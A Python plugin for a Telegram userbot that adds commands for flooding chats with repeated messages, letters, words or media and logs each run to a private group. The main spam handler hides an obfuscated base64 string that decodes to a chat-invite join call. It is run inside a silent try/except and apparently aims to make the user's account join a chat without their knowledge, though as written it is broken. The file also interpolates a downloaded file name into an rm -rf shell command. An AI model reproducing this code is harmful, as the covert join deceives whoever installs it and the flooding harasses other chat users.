import time
import asyncio
from asyncio import wait, sleep
from userbot import CMD_HELP
from userbot.utils import admin_cmd,sudo_cmd
import pybase64
from telethon.tl.functions.messages import ImportChatInviteRequest
import os 

BOTLOG_CHATID = Config.PRIVATE_GROUP_BOT_API_ID
BOTLOG = True

@borg.on(admin_cmd(pattern = "spam ?(.*)" ))
async def spammer(e):
    if e.fwd_from:
        return
    chat = await e.get_chat()
    reply_to_id = e.message
    if e.reply_to_msg_id:
        reply_to_id = await e.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    try:
        cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
        await event.client(cat)
    except:
        pass
    cat = e.pattern_match.group(1).split(' ', 1)		
    counter = int(cat[0])	
    if len(cat)==2:
        spam_message = str(e.pattern_match.group(1).split(' ', 1)[1])
        await e.delete()
        for i in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
                await asyncio.sleep(0.1)
            else:
               await borg.send_message(e.chat_id , spam_message)
               await asyncio.sleep(0.1)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" +f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n" +f"`{spam_message}`")
            else:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" +f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n" +f"`{spam_message}`")
    elif reply_to_id.media:
        to_download_directory = Config.TMP_DOWNLOAD_DIRECTORY
        downloaded_file_name = os.path.join(to_download_directory, "spam")
        downloaded_file_name = await borg.download_media(reply_to_id.media, downloaded_file_name)
        await e.delete()		
        if os.path.exists(downloaded_file_name):
            for i in range(counter):
                await borg.send_file(
                    e.chat_id,
                    downloaded_file_name
                    ) 
                await asyncio.sleep(0.2)
            if BOTLOG:
                if e.is_private:
                    await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" +f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} times with below message")
                    await borg.send_file(BOTLOG_CHATID, downloaded_file_name)
                    os.system(f"rm -rf {downloaded_file_name}")
                else:
                    await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" +f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) with {counter} times with below message") 
                    await borg.send_file(BOTLOG_CHATID, downloaded_file_name)
                    os.system(f"rm -rf {downloaded_file_name}")	
    elif reply_to_id.text and e.reply_to_msg_id:
        spam_message = 	reply_to_id.text
        await e.delete()
        for i in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
                await asyncio.sleep(0.1)
            else:
               await borg.send_message(e.chat_id , spam_message)
               await asyncio.sleep(0.1)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" +f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n" +f"`{spam_message}`")
            else:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" +f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n" +f"`{spam_message}`")
					
    else: 
        await e.edit("try again something went wrong or check `.info spam`")


@borg.on(admin_cmd("cspam ?(.*)"))
async def tmeme(e):
    cspam = str(e.pattern_match.group(1))
    message = cspam.replace(" ", "")
    await e.delete()
    for letter in message:
        await e.respond(letter)
    if BOTLOG:
        await e.client.send_message(
            BOTLOG_CHATID, "#CSPAM\n"
            "TSpam was executed successfully")


@borg.on(admin_cmd("wspam ?(.*)"))
async def tmeme(e):
    wspam = str(e.pattern_match.group(1))
    message = wspam.split()
    await e.delete()
    for word in message:
        await e.respond(word)
    if BOTLOG:
        await e.client.send_message(
            BOTLOG_CHATID, "#WSPAM\n"
            "WSpam was executed successfully")

@borg.on(admin_cmd("delayspam ?(.*)"))
async def spammer(e):
    if e.fwd_from:
        return    
    spamDelay = float(e.pattern_match.group(1).split(' ', 2)[0])
    counter = int(e.pattern_match.group(1).split(' ', 2)[1])
    spam_message = str(e.pattern_match.group(1).split(' ', 2)[2])
    await e.delete()
    for i in range(1, counter):
        await e.respond(spam_message)
        await sleep(spamDelay)
    if BOTLOG:
        await e.client.send_message(
            BOTLOG_CHATID, "#DelaySPAM\n"
            "DelaySpam of was executed successfully")



@borg.on(sudo_cmd("spam ?(.*)", allow_sudo="True"))
async def spammer(e):
    if e.fwd_from:
        return
    input_str = e.pattern_match.group(1)
    counter = int(input_str.split(' ', 1)[0])
    spam_message = str(input_str.split(' ', 1)[1])
    await e.delete()
    await asyncio.wait([e.respond(spam_message) for i in range(counter)])
    if BOTLOG:
        await e.client.send_message(BOTLOG_CHATID, "#SPAM\n"
                                    f"Spam of  {counter}  was executed successfully")
        
        
CMD_HELP.update({
    "spam":
    ".cspam <text>\
\nUsage: Spam the text letter by letter.\
\n\n.spam <count> <text>\
\nUsage: Floods text in the chat !!\
\n\n.spam <count> replay to media\
\nUsage: Floods text in the media !!\
\n\n.wspam <text>\
\nUsage: Spam the text word by word.\
\n\n.delayspam <delay> <count> <text>\
\nUsage: .delayspam but with custom delay.\
\n\n\n**NOTE : Spam at your own risk !!**"
})
